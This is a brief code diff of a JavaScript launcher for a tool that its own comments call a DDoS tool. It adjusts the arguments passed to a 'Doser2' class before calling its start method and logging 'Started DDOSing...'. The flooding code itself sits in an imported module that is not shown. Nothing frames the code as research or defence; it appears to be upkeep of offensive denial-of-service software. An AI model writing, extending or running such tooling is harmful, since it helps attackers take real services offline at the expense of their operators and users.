@@ -7,7 +7,7 @@ var doser2_1 = require("./doser2");
 // console.log('Script started: ', args);
 var timeout = undefined;
 function start() {
-    var doser = new doser2_1.Doser2(true, 10); //32
+    var doser = new doser2_1.Doser2(); //32
     console.log('Started DDOSing...');
     doser.start(); //Start DDOSing
 }
